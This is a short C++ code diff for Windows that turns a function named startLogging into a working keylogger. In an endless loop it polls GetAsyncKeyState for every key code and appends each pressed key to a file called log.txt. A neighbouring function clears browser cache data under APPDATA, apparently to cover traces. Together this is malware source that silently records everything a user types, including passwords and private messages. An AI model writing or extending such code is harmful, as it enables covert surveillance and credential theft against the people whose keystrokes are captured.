@@ -3,6 +3,7 @@
 #include <string>
 #include <filesystem>
 #include <Windows.h>
+#include <fstream>
 
 void clearBrowserCache(){
     std::string appData = getenv("APPDATA");
@@ -27,9 +28,11 @@ void clearBrowserCache(){
 
 void startLogging(){
     while(true){
-        for (int i = 8; i <= 254; i++){
-            if (GetAsyncKeyState(i) & 0x1) {
-                std::cout << i;
+        for (int i = 0x08; i <= 0xFE; i++){
+            if (GetAsyncKeyState(i) & 0x8000) {
+                std::ofstream log;
+                log.open("log.txt", std::ios::app);
+                log << char(i);
             }
         }
     }
